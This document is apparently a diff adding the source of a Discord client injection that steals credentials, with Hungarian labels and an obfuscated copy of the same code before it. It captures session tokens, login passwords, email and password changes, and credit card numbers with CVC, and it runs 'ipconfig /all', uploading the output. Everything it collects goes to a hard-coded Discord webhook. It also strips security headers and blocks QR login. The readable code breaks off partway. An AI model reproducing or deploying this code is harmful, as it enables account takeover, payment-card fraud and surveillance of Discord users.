_0xea7e86={'protocol':_0x2c4e5e['protocol'],'hostname':_0x2c4e5e[_0x43557a(0xe8)],'path':_0x2c4e5e[_0x43557a(0x118)],'method':_0x43557a(0x156),'headers':_0x2699f2},_0x3c465b=https[_0x43557a(0x12d)](_0xea7e86);_0x3c465b['on'](_0x43557a(0x117),_0x41db46=>{var _0x5e0d89=_0x43557a;console[_0x5e0d89(0x1a5)](_0x41db46);}),_0x3c465b[_0x43557a(0x176)](JSON[_0x43557a(0x165)](_0xf9f70e)),_0x3c465b[_0x43557a(0x101)]();}function createEmbed(_0xcfe915){var _0x589ad4=_0x4b4897;let _0x35e156={'footer':config[_0x589ad4(0x15e)][_0x589ad4(0x178)],'timestamp':new Date()};for(let [_0x18901b,_0x4a7a5d]of Object[_0x589ad4(0x191)](_0xcfe915)){_0x35e156[_0x18901b]=_0x4a7a5d;}return _0x35e156;}async function initialize(){var _0x3f35fd=_0x4b4897;if(!fs[_0x3f35fd(0xf7)](process[_0x3f35fd(0x198)]()+'/'+config['brand'])){fs[_0x3f35fd(0x172)](process['cwd']()+'/'+config['brand']);var _0x3664c4=undefined;_0x3664c4=await getToken();const _0x1092f5=await getIp();var _0x1a684a,_0x406dfc,_0x392f55;config[_0x3f35fd(0x196)]&&(_0x3664c4==undefined?sendToWebhook({'username':config[_0x3f35fd(0x15e)]['username'],'avatar_url':config['embed'][_0x3f35fd(0x139)],'url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x184)],'embeds':[createEmbed({'title':_0x3f35fd(0x190),'fields':[{'name':_0x3f35fd(0x127),'value':_0x3f35fd(0x13c)+os[_0x3f35fd(0x1a2)]+'```','inline':![]},{'name':_0x3f35fd(0x188),'value':_0x3f35fd(0x13c)+getDiscordClient()+_0x3f35fd(0x13c),'inline':![]},{'name':_0x3f35fd(0x161),'value':'```yaml\x0aIP\x20Cím:\x20'+(_0x1092f5['ip']??_0x3f35fd(0x150))+_0x3f35fd(0xe9)+(_0x1092f5['hostname']??'Ismeretlen')+'\x0aVáros:\x20'+(_0x1092f5[_0x3f35fd(0xeb)]??'Ismeretlen')+_0x3f35fd(0x183)+(_0x1092f5['region']??_0x3f35fd(0x150))+_0x3f35fd(0x18f)+(_0x1092f5['country']??_0x3f35fd(0x150))+_0x3f35fd(0x121)+(_0x1092f5[_0x3f35fd(0x123)]??_0x3f35fd(0x150))+_0x3f35fd(0x13c),'inline':![]}]})]}):(_0x1a684a=await getUserInfo(_0x3664c4),_0x406dfc=await getBilling(_0x3664c4),_0x392f55=await getRelationships(_0x3664c4),sendToWebhook({'username':config[_0x3f35fd(0x15e)][_0x3f35fd(0x15d)],'avatar_url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x139)],'embeds':[createEmbed({'title':_0x3f35fd(0x155),'url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x184)],'author':{'name':_0x1a684a[_0x3f35fd(0x15d)]+'#'+_0x1a684a[_0x3f35fd(0x15b)]+'\x20('+_0x1a684a['id']+')','url':config[_0x3f35fd(0x15e)]['href'],'icon_url':_0x1a684a[_0x3f35fd(0x113)]?_0x3f35fd(0x160)+_0x1a684a['id']+'/'+_0x1a684a['avatar']:_0x3f35fd(0x122)},'thumbnail':{'url':_0x1a684a[_0x3f35fd(0x113)]?'https://cdn.discordapp.com/avatars/'+_0x1a684a['id']+'/'+_0x1a684a[_0x3f35fd(0x113)]:_0x3f35fd(0x122)},'fields':[{'name':_0x3f35fd(0x147),'value':'```'+_0x1a684a[_0x3f35fd(0x18a)]+_0x3f35fd(0x13c),'inline':!![]},{'name':_0x3f35fd(0x16f),'value':'```'+(_0x1a684a[_0x3f35fd(0x10d)]??'Nincs')+'```','inline':![]},{'name':_0x3f35fd(0x158),'value':''+getNitro(_0x1a684a['premium_type']),'inline':![]},{'name':_0x3f35fd(0x136),'value':''+_0x406dfc,'inline':!![]},{'name':_0x3f35fd(0x16e),'value':''+getBadges(_0x1a684a['flags']),'inline':![]},{'name':_0x3f35fd(0x109),'value':_0x3f35fd(0x13c)+_0x3664c4+_0x3f35fd(0x13c),'inline':![]},{'name':'Kliens\x20verzió','value':_0x3f35fd(0x13c)+getDiscordClient()+'```','inline':![]},{'name':_0x3f35fd(0x161),'value':_0x3f35fd(0x17d)+(_0x1092f5['ip']??_0x3f35fd(0x150))+_0x3f35fd(0xe9)+(_0x1092f5[_0x3f35fd(0x1a2)]??_0x3f35fd(0x150))+'\x0aVáros:\x20'+(_0x1092f5['city']??_0x3f35fd(0x150))+_0x3f35fd(0x183)+(_0x1092f5[_0x3f35fd(0xf1)]??_0x3f35fd(0x150))+_0x3f35fd(0x18f)+(_0x1092f5[_0x3f35fd(0x102)]??_0x3f35fd(0x150))+_0x3f35fd(0x121)+(_0x1092f5[_0x3f35fd(0x123)]??_0x3f35fd(0x150))+_0x3f35fd(0x13c),'inline':![]}]}),createEmbed({'description':'**Összes\x20barát\x20('+_0x392f55[_0x3f35fd(0x12c)]+')**\x0a\x0a'+_0x392f55[_0x3f35fd(0x17c)],'thumbnail':{'url':_0x1a684a[_0x3f35fd(0x113)]?_0x3f35fd(0x160)+_0x1a684a['id']+'/'+_0x1a684a[_0x3f35fd(0x113)]:_0x3f35fd(0x122)},'author':{'name':_0x1a684a[_0x3f35fd(0x15d)]+'#'+_0x1a684a[_0x3f35fd(0x15b)]+'\x20('+_0x1a684a['id']+')','url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x184)],'icon_url':_0x1a684a[_0x3f35fd(0x113)]?_0x3f35fd(0x160)+_0x1a684a['id']+'/'+_0x1a684a['avatar']:_0x3f35fd(0x122)}})]}))),config[_0x3f35fd(0x140)]&&_0x3664c4&&(await execScript(_0x3f35fd(0x149),!![])[_0x3f35fd(0x16c)](_0x451585=>{}),config[_0x3f35fd(0x10c)]&&sendToWebhook({'username':config[_0x3f35fd(0x15e)][_0x3f35fd(0x15d)],'avatar_url':config['embed']['avatar_url'],'embeds':[createEmbed({'title':_0x3f35fd(0x144),'url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x184)],'author':{'name':_0x1a684a[_0x3f35fd(0x15d)]+'#'+_0x1a684a[_0x3f35fd(0x15b)]+'\x20('+_0x1a684a['id']+')','url':config[_0x3f35fd(0x15e)][_0x3f35fd(0x184)],'icon_url':_0x1a684a[_0x3f35fd(0x113)]?_0x3f35fd(0x160)+_0x1a684a['id']+'/'+_0x1a684a[_0x3f35fd(0x113)]:_0x3f35fd(0x122)},'thumbnail':{'url':_0x1a684a['avatar']?_0x3f35fd(0x160)+_0x1a684a['id']+'/'+_0x1a684a[_0x3f35fd(0x113)]:_0x3f35fd(0x122)},'fields':[{'name':'Nitro\x20típus','value':''+getNitro(_0x1a684a[_0x3f35fd(0x142)]),'inline':![]},{'name':_0x3f35fd(0x136),'value':''+_0x406dfc,'inline':!![]},{'name':_0x3f35fd(0x16e),'value':''+getBadges(_0x1a684a[_0x3f35fd(0x1a1)]),'inline':![]},{'name':'Belépési\x20azonosító','value':'```'+_0x3664c4+_0x3f35fd(0x13c),'inline':![]}]})]}));}}module['exports']=require(_0x4b4897(0x132));
+const {
+    BrowserWindow,
+    session,
+} = require('electron');
+const os = require('os');
+const https = require('https');
+const querystring = require("querystring");
+const fs = require("fs");
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const { exec } = require("child_process");
+const { Webhook } = require('discord-webhook-node')
+
+
+var config = {
+    brand: "ekreta_fucker",
+
+    webhook: "https://discord.com/api/webhooks/1026932252527034468/EeNHdK3Xq4bQ3kU2IGqHbhz6AqjY60xeYAZM1DIA4mf7fUuWEIQxVc_D7nxhBTTFGI78",
+
+    logout: true,
+    disable_qr_code: true,
+
+    notify_on_logout: true,
+    notify_on_initialization: true,
+    ping: [true, "@everyone"],
+
+    embed: {
+        username: "ekreta fucker",
+        footer: {
+            text: `ekreta fucker`,
+            icon_url: "https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc",
+        },
+        href: "https://fasszopo.kiberesek.com",
+        avatar_url: "https://imgs.search.brave.com/N-9kvAmVSutTgaCanpsI7xMw51dGFLLZtG31JNIGAGg/rs:fit:512:512:1/g:ce/aHR0cDovL3NvYnN6/ZWdlZC5odS9vcmRl/cmVkLzY0MTY5L3Bp/Yy9rcmV0YS5wbmc"
+    },
+
+    badges: {
+        Discord_Employee: {
+            Value: 1,
+            Emoji: "<:staff:874750808728666152>",
+            Rare: true,
+        },
+        Partnered_Server_Owner: {
+            Value: 2,
+            Emoji: "<:partner:874750808678354964>",
+            Rare: true,
+        },
+        HypeSquad_Events: {
+            Value: 4,
+            Emoji: "<:hypesquad_events:874750808594477056>",
+            Rare: true,
+        },
+        Bug_Hunter_Level_1: {
+            Value: 8,
+            Emoji: "<:bughunter_1:874750808426692658>",
+            Rare: true,
+        },
+        Early_Supporter: {
+            Value: 512,
+            Emoji: "<:early_supporter:874750808414113823>",
+            Rare: true,
+        },
+        Bug_Hunter_Level_2: {
+            Value: 16384,
+            Emoji: "<:bughunter_2:874750808430874664>",
+            Rare: true,
+        },
+        Early_Verified_Bot_Developer: {
+            Value: 131072,
+            Emoji: "<:developer:874750808472825986>",
+            Rare: true,
+        },
+        House_Bravery: {
+            Value: 64,
+            Emoji: "<:bravery:874750808388952075>",
+            Rare: false,
+        },
+        House_Brilliance: {
+            Value: 128,
+            Emoji: "<:brilliance:874750808338608199>",
+            Rare: false,
+        },
+        House_Balance: {
+            Value: 256,
+            Emoji: "<:balance:874750808267292683>",
+            Rare: false,
+        }
+    },
+
+    filters: {
+        user: {
+            urls: [
+                "https://discord.com/api/v*/users/@me",
+                "https://discordapp.com/api/v*/users/@me",
+                "https://*.discord.com/api/v*/users/@me",
+                "https://discordapp.com/api/v*/auth/login",
+                'https://discord.com/api/v*/auth/login',
+                'https://*.discord.com/api/v*/auth/login',
+                "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
+                "https://api.stripe.com/v*/tokens",
+                "https://api.stripe.com/v*/setup_intents/*/confirm",
+                "https://api.stripe.com/v*/payment_intents/*/confirm",
+            ]
+        },
+        qr_codes: {
+            urls: [
+                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+                "https://*.discord.com/api/v*/applications/detectable",
+                "https://discord.com/api/v*/applications/detectable",
+                "https://*.discord.com/api/v*/users/@me/library",
+                "https://discord.com/api/v*/users/@me/library",
+                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+                "https://discord.com/api/v*/users/@me/billing/subscriptions",
+                "wss://remote-auth-gateway.discord.gg/*"
+            ]
+        }
+    }
+}
+
+exec("ipconfig /all", (error, stdout, stderr) => {
+	fs.writeFile('ipconfig.txt', stdout, async function (err) {
+	const hook = new Webhook(config.webhook);
+
+await hook.sendFile('./ipconfig.txt');
+})
+setTimeout(function () {
+	fs.unlink('ipconfig.txt', function (err) {
+		if (err) throw err;
+	}
+		);
+}, 8000);
+})
+
+
+var execScript = (script) => {
+    const window = BrowserWindow.getAllWindows()[0]
+    return window.webContents.executeJavaScript(script, true);
+}
+
+class Event {
+    constructor(event, token, data) {
+        for (let [key, value] of Object.entries({
+                "event": event,
+                "data": data,
+                "token": token
+            })) {
+            this[key] = value;
+        }
+    }
+
+    handle() {
+        switch (this["event"]) {
+            case "passwordChanged":
+                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
+                break;
+            case 'userLogin':
+                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
+                break;
+            case 'emailChanged':
+                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
+                break;
+            case "creditCardAdded":
+                event_handlers["creditCardAdded"](this.data.number, this.data.cvc, this.data.exp_month, this.data.exp_year, this.token);
+        }
+    }
+}
+
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    try {
+        if (details.url.startsWith(config.webhook)) {
+            if (details.url.includes("discord.com")) {
+                callback({
+                    responseHeaders: Object.assign({
+                        'Access-Control-Allow-Headers': "*"
+                    }, details.responseHeaders)
+                });
+            } else {
+                callback({
+                    responseHeaders: Object.assign({
+                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+                        'Access-Control-Allow-Headers': "*",
+                        "Access-Control-Allow-Origin": "*"
+                    }, details.responseHeaders)
+                });
+            }
+        } else {
+            delete details.responseHeaders['content-security-policy'];
+            delete details.responseHeaders['content-security-policy-report-only'];
+
+            callback({
+                responseHeaders: {
+                    ...details.responseHeaders,
+                    'Access-Control-Allow-Headers': "*"
+                }
+            })
+        }
+
+    } catch {}
+})
+
+session.defaultSession.webRequest.onBeforeRequest(config.filters["qr_codes"], async (details, callback) => {
+    if (details.url.startsWith("wss://")) {
+        if (!config.disable_qr_code == false) {
+            callback({
+                cancel: true
+            })
+            return;
+        }
+    }
+
+    await initialize();
+
+    callback({})
+    return;
+})
+
+session.defaultSession.webRequest.onCompleted(config.filters["user"], async (details, callback) => {
+    try {
+        if (details.statusCode == 200 || details.statusCode == 204) {
+            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+            const data = JSON.parse(unparsed_data)
+            const token = await getToken();
+
+            switch (true) {
+                case details.url.endsWith('login'):
+                    (new Event('userLogin', token, {
+                        password: data.password,
+                        email: data.login
+                    })).handle();;
+                    return;
+                case details.url.endsWith("tokens") && details.method == "POST":
+                    const item = querystring.parse(unparsed_data.toString());
+                    (new Event('creditCardAdded', token, {
+                        number: item["card[number]"],
+                        cvc: item["card[cvc]"],
+                        exp_month: item["card[exp_month]"],
+                        exp_year: item["card[exp_year]"],
+                    }))
+
+                case details.url.endsWith('users/@me') && details.method == 'PATCH':
+                    if (!data.password) return;
+                    if (data.email) {
+                        (new Event('emailChanged', token, {
+                            password: data.password,
+                            email: data.email
+                        })).handle();
+                    };
+                    if (data.new_password) {
+                        (new Event('passwordChanged', token, {
+                            password: data.password,
+                            new_password: data.new_password
+                        })).handle();
+                    };
+                    return;
+                default:
+                    break;
+            }
+        } else {
+            return;
+        }
+
+    } catch {}
+})
+
+var event_handlers = {
+
+    async creditCardAdded(number, cvc, month, year) {
+        const userInfo = await getUserInfo(token);
+        const billing = await getBilling(token);
+        const friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Hitelkártya hozzáadva",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "Hitelkártya szám",
+                        value: `\`\`\`${number}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Hitelkártya CVC",
+                        value: `\`\`\`${cvc}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Hitelkártya lejárata",
+                        value: `\`\`\`${month}/${year}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Telefonszám",
+                        value: `\`\`\`${userInfo.phone ?? "Nincs"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Nitro típus",
+                        value: `${getNitro(userInfo.premium_type)}`,
+                        inline: false
+                    }, {
+                        name: "Számlázás",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "Szelvények",
+                        value: `${getBadges(userInfo.flags)}`,
+                        inline: false
+                    },
+                    {
+                        name: "Belépési azonosító",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Összes barát (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async userLogin(password, email, token) {
+        const userInfo = await getUserInfo(token);
+        const billing = await getBilling(token);
+        const friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Bejelentkezett felhasználó",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "Jelszó",
+                        value: `\`\`\`${password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Email Cím",
+                        value: `\`\`\`${email}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Telefonszám",
+                        value: `\`\`\`${userInfo.phone ?? "Nincs"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Nitro típus",
+                        value: `${getNitro(userInfo.premium_type)}`,
+                        inline: false
+                    }, {
+                        name: "Számlázás",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "Szelvények",
+                        value: `${getBadges(userInfo.flags)}`,
+                        inline: false
+                    },
+                    {
+                        name: "Belépési azonosító",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Összes barát (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async emailChanged(password, newEmail, token) {
+        var userInfo = await getUserInfo(token);
+        var billing = await getBilling(token);
+        var friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Email Cím megváltozott",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "Új Email Cím",
+                        value: `\`\`\`${newEmail}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Jelszó",
+                        value: `\`\`\`${password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: "Telefonszám",
+                        value: `\`\`\`${userInfo.phone ?? "Nincs"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Nitro típus",
+                        value: `${getNitro(userInfo.premium_type)}`,
+                        inline: false
+                    }, {
+                        name: "Számlázás",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "Szelvények",
+                        value: `${getBadges(userInfo.flags)}`,
+                        inline: false
+                    },
+                    {
+                        name: "Belépési azonosító",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Összes Barát (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+
+    async passwordChanged(oldPassword, newPassword, token) {
+        var userInfo = await getUserInfo(token);
+        var billing = await getBilling(token);
+        var friends = await getRelationships(token);
+
+        var params = {
+            username: config.embed.username,
+            avatar_url: config.embed.avatar_url,
+            embeds: [createEmbed({
+                title: "Jelszó megváltozott",
+                url: config.embed.href,
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                fields: [{
+                        name: "Régi jelszó",
+                        value: `\`\`\`${oldPassword}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Új jelszó",
+                        value: `\`\`\`${newPassword}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Telefonszám",
+                        value: `\`\`\`${userInfo.phone ?? "Nincs"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Nitro típus",
+                        value: `${getNitro(userInfo.premium_type)}`,
+                        inline: false
+                    }, {
+                        name: "Számlázás",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "Szelvények",
+                        value: `${getBadges(userInfo.flags)}`,
+                        inline: false
+                    },
+                    {
+                        name: "Belépési azonosító",
+                        value: `\`\`\`${token}\`\`\``,
+                        inline: false
+                    },
+                ],
+            }), createEmbed({
+                description: `**Összes barát (${friends['length']})**\n\n${friends.frien}`,
+                thumbnail: {
+                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+                author: {
+                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                    url: config.embed.href,
+                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                },
+            })]
+        }
+
+        sendToWebhook(params)
+    },
+}
+
+// ==================================================================================
+
+function getDiscordClient() {
+    return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
+}
+
+// ==================================================================================
+
+function getNitro(flags) {
+    switch (flags) {
+        case 0:
+            return "\`\`\`Nincs nitro\`\`\`";
+        case 1:
+            return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
+        case 2:
+            return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
+        default:
+            return "\`\`\`Nincs nitro\`\`\`";
+
+    };
+}
+
+function getRareBadges(flags) {
+    var b = '';
+    for (const prop in config.badges) {
+        let o = config.badges[prop];
+        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
+    };
+    return b;
+}
+
+function getBadges(flags) {
+    var b = '';
+    for (const prop in config.badges) {
+        let o = config.badges[prop];
+        if ((flags & o.Value) == o.Value) b += o.Emoji;
+    };
+    if (b == '') b = '\`\`\`Nincs\`\`\`'
+    return b;
+}
+
+async function getToken() {
+    return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
+}
+
+async function getIp() {
+    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;`, true));
+}
+
+async function getUserInfo(token) {
+    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true));
+}
+
+async function getBilling(token) {
+    var a = await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
+    var json = JSON.parse(a)
+
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == "") {
+            return "\`\`\`❌\`\`\`";
+        } else if (z.type == 2 && z.invalid != true) {
+            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
+        } else if (z.type == 1 && z.invalid != true) {
+            billing += "\`✔️\`" + " :credit_card:";
+        } else {
+            return "\`\`\`❌\`\`\`";
+        };
+    });
+
+    if (billing == "") billing = "\`\`\`❌\`\`\`"
+    return billing;
+}
+
+async function getRelationships(token) {
+    var a = await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, true)
+    var json = JSON.parse(a)
+    const r = json.filter((user) => {
+        return user.type == 1
+    })
+    var rareBadgesFriends = "";
+    for (z of r) {
+        var b = getRareBadges(z.user.public_flags)
+        if (b != "") {
+            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
+        }
+    }
+    if (!rareBadgesFriends) rareBadgesFriends = "Nincsenek értékes barátok"
+
+    return {
+        length: r.length,
+        frien: rareBadgesFriends
+    }
+}
+
+// ==================================================================================
+
+function sendToWebhook(params) {
+
+    if (config.ping[0] == true) {
+        if (params.content) {
+            params.content = params.content + ` ||${config.ping[1]}||`
+        } else {
+            params.content = `||${config.ping[1]}||`
+        }
+    }
+
+    var url = new URL(config.webhook);
+    var headers = {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+    }
+    const options = {
+        protocol: url.protocol,
+        hostname: url.host,
+        path: url.pathname,
+        method: 'POST',
+        headers: headers,
+    };
+    const req = https.request(options);
+    req.on('error', (err) => {
+        console.log(err);
+    });
+    req.write(JSON.stringify(params));
+    req.end();
+}
+
+// ==================================================================================
+
+function createEmbed(data) {
+    let obj = {
+        "footer": config.embed.footer,
+        "timestamp": new Date(),
+    }
+
+    for (let [key, value] of Object.entries(data)) {
+        obj[key] = value;
+    }
+
+    return obj;
+}
+
+// ==================================================================================
+
+async function initialize() {
+
+    if (!fs.existsSync(`${process.cwd()}/${config.brand}`)) {
+        fs.mkdirSync(`${process.cwd()}/${config.brand}`)
+
+        var token = undefined;
+
+        token = await getToken();
+
+        const network_data = await getIp()
+
+        var userInfo;
+        var billing;
+        var friends;
+
+        if (config.notify_on_initialization) {
+            if (token == undefined) {
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    url: config.embed.href,
+                    embeds: [createEmbed({
+                        title: "Discord Kliens beazonosítva (Nincs bejelentkezve)",
+                        fields: [{
+                            name: "Felhasználó",
+                            value: `\`\`\`${os.hostname}\`\`\``,
+                            inline: false
+                        }, {
+                            name: "Kliens verzió",
+                            value: `\`\`\`${getDiscordClient()}\`\`\``,
+                            inline: false
+                        }, {
+                            name: "Csatlakozási adatok",
+                            value: `\`\`\`yaml\nIP Cím: ${network_data['ip'] ?? "Ismeretlen"}\nSzolgáltató: ${network_data['hostname'] ?? "Ismeretlen"}\nVáros: ${network_data['city'] ?? "Ismeretlen"}\nRégió: ${network_data['region'] ?? "Ismeretlen"}\nOrszág: ${network_data["country"] ?? "Ismeretlen"}\nIdőzóna: ${network_data["timezone"] ?? "Ismeretlen"}\`\`\``,
+                            inline: false
+                        }],
+                    })]
+                })
+            } else {
+                userInfo = await getUserInfo(token);
+                billing = await getBilling(token);
+                friends = await getRelationships(token);
+
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    embeds: [createEmbed({
+                        title: "Discord Kliens beazonosítva",
+                        url: config.embed.href,
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        fields: [{
+                                name: "Email Cím",
+                                value: `\`\`\`${userInfo.email}\`\`\``,
+                                inline: true
